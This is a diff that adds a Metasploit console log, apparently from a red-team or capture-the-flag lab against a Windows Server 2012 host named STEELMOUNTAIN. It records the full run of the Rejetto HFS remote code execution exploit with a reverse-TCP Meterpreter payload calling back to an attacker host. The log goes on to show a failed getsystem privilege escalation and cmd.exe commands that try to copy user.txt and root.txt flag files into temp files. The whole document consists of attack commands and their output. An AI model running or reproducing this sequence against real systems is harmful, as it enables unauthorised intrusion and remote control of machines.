@@ -1,0 +1,85 @@
+[*] Spooling to file /home/kali/Redteam-Hermes/logs/steel_state/post_attempt.log...
+resource (/tmp/steel_post.rc)> use exploit/windows/http/rejetto_hfs_exec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+resource (/tmp/steel_post.rc)> set RHOSTS 10.146.141.173
+RHOSTS => 10.146.141.173
+resource (/tmp/steel_post.rc)> set RPORT 8080
+RPORT => 8080
+resource (/tmp/steel_post.rc)> set payload windows/meterpreter_reverse_tcp
+payload => windows/meterpreter_reverse_tcp
+resource (/tmp/steel_post.rc)> set LHOST 192.168.129.182
+LHOST => 192.168.129.182
+resource (/tmp/steel_post.rc)> set LPORT 4447
+LPORT => 4447
+resource (/tmp/steel_post.rc)> run -z
+[*] Started reverse TCP handler on 192.168.129.182:4447 
+[*] Using URL: http://192.168.129.182:8080/7AaKrfI8B
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /7AaKrfI8B
+[!] Tried to delete %TEMP%\dtVxLHzeMdlwmY.vbs, unknown result
+[*] Meterpreter session 1 opened (192.168.129.182:4447 -> 10.146.141.173:51637) at 2026-05-22 17:07:21 -0700
+[*] Server stopped.
+[*] Session 1 created in the background.
+resource (/tmp/steel_post.rc)> sleep 8
+resource (/tmp/steel_post.rc)> sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                         Connection
+  --  ----  ----                     -----------                         ----------
+  1         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4447 -> 10.146.141.173:51637 (10.146.141.173)
+
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "getuid" --timeout 45
+[*] Running 'getuid' on meterpreter session 1 (10.146.141.173)
+Server username: STEELMOUNTAIN\bill
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "sysinfo" --timeout 45
+[*] Running 'sysinfo' on meterpreter session 1 (10.146.141.173)
+Computer        : STEELMOUNTAIN
+OS              : Windows Server 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "getsystem" --timeout 90
+[*] Running 'getsystem' on meterpreter session 1 (10.146.141.173)
+[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+[-] Named Pipe Impersonation (RPCSS variant)
+[-] Named Pipe Impersonation (PrintSpooler variant)
+[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "getuid" --timeout 45
+[*] Running 'getuid' on meterpreter session 1 (10.146.141.173)
+Server username: STEELMOUNTAIN\bill
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "execute -f cmd.exe -a '/c whoami > C:\\Windows\\Temp\\w.txt' -H"
+[*] Running 'execute -f cmd.exe -a '/c whoami > C:\Windows\Temp\w.txt' -H' on meterpreter session 1 (10.146.141.173)
+Process 804 created.
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "cat C:\\Windows\\Temp\\w.txt" --timeout 45
+[*] Running 'cat C:\Windows\Temp\w.txt' on meterpreter session 1 (10.146.141.173)
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "execute -f cmd.exe -a '/c type C:\\Users\\bill\\Desktop\\user.txt > C:\\Windows\\Temp\\u.txt' -H"
+[*] Running 'execute -f cmd.exe -a '/c type C:\Users\bill\Desktop\user.txt > C:\Windows\Temp\u.txt' -H' on meterpreter session 1 (10.146.141.173)
+Process 148 created.
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "cat C:\\Windows\\Temp\\u.txt" --timeout 45
+[*] Running 'cat C:\Windows\Temp\u.txt' on meterpreter session 1 (10.146.141.173)
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "execute -f cmd.exe -a '/c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Windows\\Temp\\r.txt' -H"
+[*] Running 'execute -f cmd.exe -a '/c type C:\Users\Administrator\Desktop\root.txt > C:\Windows\Temp\r.txt' -H' on meterpreter session 1 (10.146.141.173)
+Process 936 created.
+resource (/tmp/steel_post.rc)> sessions -i 1 -C "cat C:\\Windows\\Temp\\r.txt" --timeout 45
+[*] Running 'cat C:\Windows\Temp\r.txt' on meterpreter session 1 (10.146.141.173)
+[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
+resource (/tmp/steel_post.rc)> sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                         Connection
+  --  ----  ----                     -----------                         ----------
+  1         meterpreter x86/windows  STEELMOUNTAIN\bill @ STEELMOUNTAIN  192.168.129.182:4447 -> 10.146.141.173:51637 (10.146.141.173)
+
+resource (/tmp/steel_post.rc)> spool off
